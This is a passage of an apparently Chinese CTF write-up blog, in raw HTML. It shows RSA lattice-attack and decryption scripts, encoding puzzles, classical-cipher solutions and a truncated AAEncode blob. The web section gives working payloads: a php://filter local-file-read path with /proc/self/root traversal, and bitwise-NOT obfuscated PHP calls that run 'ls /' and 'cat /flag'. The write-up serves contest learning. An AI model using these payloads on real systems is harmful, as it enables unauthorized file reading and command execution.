class="number">0.01</span></span><br><span class="line">beta=<span class="number">0.37</span></span><br><span class="line"><span class="built_in">Scale</span>=<span class="number">35</span></span><br><span class="line">Mvalue=<span class="number">22</span></span><br><span class="line">M=getMatrix(<span class="built_in">Scale</span>,Mvalue,N,E,delta,beta)</span><br><span class="line">M=matrix(ZZ,M)</span><br><span class="line">A=M.LLL()[<span class="number">0</span>]</span><br><span class="line">p = []</span><br><span class="line">X = <span class="built_in">int</span>(pow(N,delta)*(<span class="built_in">Scale</span>+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">Y = <span class="built_in">int</span>(pow(N,(delta+beta))*(<span class="built_in">Scale</span>+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">for i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">Scale</span>):</span><br><span class="line">    p.append(A[i]//(X**(<span class="built_in">Scale</span>-<span class="number">1</span>-i)*Y**i))</span><br><span class="line">PR.&lt;x,y&gt;=PolynomialRing(ZZ)</span><br><span class="line">f=<span class="number">0</span></span><br><span class="line">for i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">Scale</span>):</span><br><span class="line">    f+=p[i]*x^(<span class="built_in">Scale</span>-<span class="number">1</span>-i)*y^i #f=p[<span class="number">0</span>]*x^<span class="number">4</span>+p[<span class="number">1</span>]*x^<span class="number">3</span>*y+p[<span class="number">2</span>]*x^<span class="number">2</span>*y^<span class="number">2</span>+p[<span class="number">3</span>]*x*y^<span class="number">3</span>+p[<span class="number">4</span>]*y^<span class="number">4</span></span><br><span class="line"><span class="built_in">print</span>(f.factor())</span><br><span class="line">ED=datetime.now()</span><br><span class="line"><span class="built_in">print</span>(ED-ST)</span><br><span class="line">#M1 Macbook Pro上运行时间为<span class="number">11</span>分钟</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;0ver!&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number <span class="built_in">import</span> *</span><br><span class="line"><span class="attr">k</span> = <span class="comment"># Step 1中解出来的x的系数</span></span><br><span class="line"><span class="attr">dq</span> =  <span class="comment"># Step 1中解出来的y的系数 </span></span><br><span class="line"><span class="attr">c=</span> <span class="comment">#见题目附件</span></span><br><span class="line"><span class="attr">N=</span> <span class="comment">#见题目附件</span></span><br><span class="line"><span class="attr">e=</span> <span class="comment">#见题目附件</span></span><br><span class="line"><span class="attr">k</span> = k+<span class="number">1</span></span><br><span class="line"><span class="attr">q</span> = (e*dq-<span class="number">1</span>)//k+<span class="number">1</span></span><br><span class="line"><span class="attr">p</span> = N//q</span><br><span class="line">print(p,q)</span><br><span class="line"><span class="attr">d</span> = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)) </span><br><span class="line">print(d%(q-<span class="number">1</span>),d%(p-<span class="number">1</span>)) </span><br><span class="line">print(long_to_bytes(int(pow(c,d,N))) )</span><br><span class="line"><span class="comment"># Dest0g3&#123;1087fb88-a2da-4d21-d81a-40c6e1f105fa&#125;</span></span><br></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><blockquote><p>当时写了部分wp，并不全，也不打算花时间写misc的wp了😈</p></blockquote><h2 id="EasyEncode"><a href="#EasyEncode" class="headerlink" title="EasyEncode"></a>EasyEncode</h2><ul><li>爆破压缩包密码100861</li><li>摩斯码</li><li>hex</li><li>py print()</li><li>url</li><li>base64</li></ul><p><code>Dest0g3&#123;Deoding_1s_e4sy_4_U&#125;</code></p><h2 id="EasyWord"><a href="#EasyWord" class="headerlink" title="EasyWord"></a>EasyWord</h2><ul><li><a href="https://www.icode9.com/content-4-961968.html">https://www.icode9.com/content-4-961968.html</a></li></ul><p>原题，结束。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><ul><li><a href="http://120.25.154.63/2022/05/21/dest0g3-520迎新赛-web/">其他师傅WP</a></li></ul><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p><code>?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p><code>ctf[]=1</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;dddd&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;ctf[]&#x27;</span>: <span class="number">1</span>&#125;</span><br><span class="line">re = requests.post(url, headers)</span><br><span class="line"><span class="built_in">print</span>(re.text)</span><br></pre></td></tr></table></figure><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220526104704624.png" alt="POST"></p><p><code>aaa=(~%8C%86%8C%8B%9A%92)(~%93%8c%df%d0);</code></p><p><code>aaa=(~%8C%86%8C%8B%9A%92)(~%9c%9e%8b%df%d0%99%93%9e%98);</code></p><h1 id="r00t-新生赛"><a href="#r00t-新生赛" class="headerlink" title="r00t 新生赛"></a><a href="http://81.69.243.226:4000">r00t 新生赛</a></h1><blockquote><p>密码质量不高, 适合新生做</p></blockquote><h2 id="旅途中的收获"><a href="#旅途中的收获" class="headerlink" title="旅途中的收获"></a>旅途中的收获</h2><blockquote><p>PeterCai喜欢到处旅游，体验不一样的文化，寻找历史古迹。 他在地中海旅行途中发现了一封信，封面上模糊的写着“From KS”，信的内容是一段经过处理的英文，他十分想知道含义，你能帮助他吗？</p><p>注意：单词之间用_分割，格式：r00t{This_is_what_you_get}</p></blockquote><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">tuqh sqjxo</span></span><br><span class="line"><span class="attribute">xuhu yi co auo</span></span><br><span class="line"><span class="attribute">squiuh yi jxu aydw ev hecqd ucfyhu</span></span><br></pre></td></tr></table></figure><h3 id="quip"><a href="#quip" class="headerlink" title="quip"></a>quip</h3><p><code>r00t&#123;caeser_is_the_king_of_roman_empire&#125;</code></p><h2 id="物不知其数"><a href="#物不知其数" class="headerlink" title="物不知其数"></a>物不知其数</h2><blockquote><p>PeterCai在之前的旅途中遇到了一些困难，他经过思考后认为是自己的经历不够丰富，所以打算加大力度。 他在旅行途中从一本中国历史书上看到了一篇图文记载，上面描述了一位远道而来的外国人在古代建筑墙壁上发现了一些文字，读完后他在一旁写下了一句话并刻下了他的名字“affine”，PeterCai了解了文字的内容，但不明白墙壁上这些单词的意思，你能理解这句话的意义吗？ 注意：单词之间用_分割，格式：r00t{This_is_what_you_get}</p></blockquote><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">今有物不知其数，三三数之剩二，五五数之剩一，七七数之剩四，问物几何？</span><br><span class="line"><span class="attribute">a</span>=</span><br><span class="line">ilwzm reowzter nlekrq wc nle repdeinwkz kp mziecnkrc uwctko</span><br></pre></td></tr></table></figure><h3 id="CRT"><a href="#CRT" class="headerlink" title="CRT"></a>CRT</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">n</span> =<span class="meta"> [3, 5, 7 ]</span></span><br><span class="line"><span class="attribute">m</span> =<span class="meta"> [2, 1, 4]</span></span><br><span class="line"><span class="attribute">print</span>(crt(m,n)) # <span class="number">11</span></span><br></pre></td></tr></table></figure><h3 id="仿射密码（爆破b）"><a href="#仿射密码（爆破b）" class="headerlink" title="仿射密码（爆破b）"></a>仿射密码（爆破b）</h3><p>   <img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220528161229786.png" alt="image-20220528161229786"><br>   <code>r00t&#123;china_reminder_theory_is_the_reflection_of_ancestors_wisdom&#125;</code></p><h2 id="来自异乡的演讲稿"><a href="#来自异乡的演讲稿" class="headerlink" title="来自异乡的演讲稿"></a>来自异乡的演讲稿</h2><blockquote><p>完成了在欧洲的旅行后，他来到美国寻找一份来自19世纪的一份著名演讲稿，从档案馆中获取了一份存档，由于当时需要保密，所以对演讲稿进行了处理，如今无从得知当时的处理文件的方式，你能恢复演讲稿的内容并找到隐藏的秘密吗？</p><p>格式：r00t{This_is_what_you_get}</p></blockquote><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ijv vs gms siugusy ci g umsgo tcqcf vgm, osnociu vrsorsm <span class="keyword">orgo </span>igocji, <span class="keyword">jm </span>gix igocji nj tjitscqsygiy nj ysyctgosy, tgi fjiu siypms. vs gms hso <span class="keyword">ji </span>g umsgo agoofs-<span class="keyword">bcsfy </span><span class="keyword">jb </span><span class="keyword">orgo </span>vgm. vs rgqs tjhs oj ysyctgos g kjmocji <span class="keyword">jb </span><span class="keyword">orgo </span><span class="keyword">bcsfy, </span>gn g <span class="keyword">bcigf </span>msnociu kfgts <span class="keyword">bjm </span><span class="keyword">orjns </span>vrj rsms ugqs <span class="keyword">orscm </span>fcqsn <span class="keyword">orgo </span><span class="keyword">orgo </span>igocji hcuro fcqs. co cn gfojusorsm <span class="keyword">bcoociu </span>giy kmjksm <span class="keyword">orgo </span>vs nrjpfy yj <span class="keyword">orcn.ors </span>kmjtsnn cn hjms chkjmogio <span class="keyword">orgi </span><span class="keyword">ors </span>msnpfo.</span><br></pre></td></tr></table></figure><h3 id="quip-1"><a href="#quip-1" class="headerlink" title="quip"></a>quip</h3>   <figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">now we are engaged <span class="keyword">in</span> a great civil war, testing whether <span class="literal">that</span> nation, <span class="keyword">or</span> any nation so conceivedand so dedicated, can long endure. we are met <span class="literal">on</span> a great battle-field <span class="keyword">of</span> <span class="literal">that</span> war. we have come <span class="keyword">to</span> dedicate a portion <span class="keyword">of</span> <span class="literal">that</span> field, <span class="keyword">as</span> a final resting place <span class="keyword">for</span> those who here gave their lives <span class="literal">that</span> <span class="literal">that</span> nation might live. <span class="literal">it</span> <span class="keyword">is</span> altogether fitting <span class="keyword">and</span> proper <span class="literal">that</span> we should <span class="keyword">do</span> <span class="built_in">this</span>.the process <span class="keyword">is</span> more important than the result.</span><br></pre></td></tr></table></figure><p>   没思路，找不到隐藏的flag</p><p>   看了其他师傅的WP，更觉得不必做了</p><h2 id="编码的叠加态"><a href="#编码的叠加态" class="headerlink" title="编码的叠加态"></a>编码的叠加态</h2><blockquote><p>这是给大家的一份礼物 32 hex 64 (^-^) –. keyboard</p></blockquote><h3 id="cyber"><a href="#cyber" class="headerlink" title="cyber"></a>cyber</h3>   <figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&#x27;_&#x27;]; o=(ﾟｰﾟ)  =_=</span><span class="number">3</span><span class="xml">; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)/ (o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">);(ﾟДﾟ)=&#123;ﾟΘﾟ: &#x27;_&#x27; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==</span><span class="number">3</span><span class="xml">) +&#x27;_&#x27;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#x27;_&#x27;)[o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml"> -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==</span><span class="number">3</span><span class="xml">) +&#x27;_&#x27;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==</span><span class="number">3</span><span class="xml">) +&#x27;_&#x27;) [c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">];(ﾟДﾟ) [&#x27;c&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#x27;o&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&#x27;c&#x27;]+(ﾟДﾟ) [&#x27;o&#x27;]+(ﾟωﾟﾉ +&#x27;_&#x27;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==</span><span class="number">3</span><span class="xml">) +&#x27;_&#x27;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==</span><span class="number">3</span><span class="xml">) +&#x27;_&#x27;) [ﾟΘﾟ]+((ﾟｰﾟ==</span><span class="number">3</span><span class="xml">) +&#x27;_&#x27;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#x27;c&#x27;]+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#x27;o&#x27;]+((ﾟｰﾟ==</span><span class="number">3</span><span class="xml">) +&#x27;_&#x27;) [ﾟΘﾟ];(ﾟДﾟ) [&#x27;_&#x27;] =(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==</span><span class="number">3</span><span class="xml">) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==</span><span class="number">3</span><span class="xml">) +&#x27;_&#x27;) [o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml"> -ﾟΘﾟ]+((ﾟｰﾟ==</span><span class="number">3</span><span class="xml">) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#x27;_&#x27;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&#x27;\\&#x27;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml"> -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&#x27;_&#x27;)[c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">];(ﾟДﾟ) [ﾟoﾟ]=&#x27;\&quot;&#x27;;(ﾟДﾟ) [&#x27;_&#x27;] ( (ﾟДﾟ) [&#x27;_&#x27;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">) +(o</span><span class="keyword">^_</span><span class="keyword">^o</span><span class="xml">))+ 